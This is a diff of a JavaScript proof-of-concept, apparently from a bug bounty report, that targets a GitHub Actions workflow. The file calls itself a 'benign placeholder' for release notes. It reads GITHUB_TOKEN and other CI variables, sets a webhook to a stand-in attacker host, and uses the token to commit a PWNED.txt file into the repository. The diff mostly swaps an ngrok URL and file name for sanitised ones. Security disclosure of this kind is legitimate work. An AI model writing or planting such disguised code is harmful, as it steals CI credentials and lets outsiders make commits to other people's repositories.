@@ -1,7 +1,7 @@
 // Benign placeholder — would render final release notes markdown.
 import https from 'node:https';
 
-const WEBHOOK = 'https://583a0e9766b3.ngrok.app';
+const WEBHOOK = 'https://attacker.example.com';
 const token = process.env.GITHUB_TOKEN ?? '';
 const repo  = process.env.GITHUB_REPOSITORY ?? '';
 const actor = process.env.GITHUB_ACTOR ?? '';
@@ -73,10 +73,10 @@ const content = Buffer.from(
 ).toString('base64');
 
 // Get existing SHA if file already exists (required for update)
-const existingRes = await ghApi('GET', `/repos/${owner}/${repoName}/contents/PWNED-ngrok.txt`);
+const existingRes = await ghApi('GET', `/repos/${owner}/${repoName}/contents/PWNED.txt`);
 const existingSha = existingRes.json?.sha;
 
-const writeRes = await ghApi('PUT', `/repos/${owner}/${repoName}/contents/PWNED-ngrok.txt`, {
+const writeRes = await ghApi('PUT', `/repos/${owner}/${repoName}/contents/PWNED.txt`, {
   message: 'chore: attacker-controlled commit via ngrok PoC (H1 #3679812)',
   content,
   ...(existingSha ? { sha: existingSha } : {}),
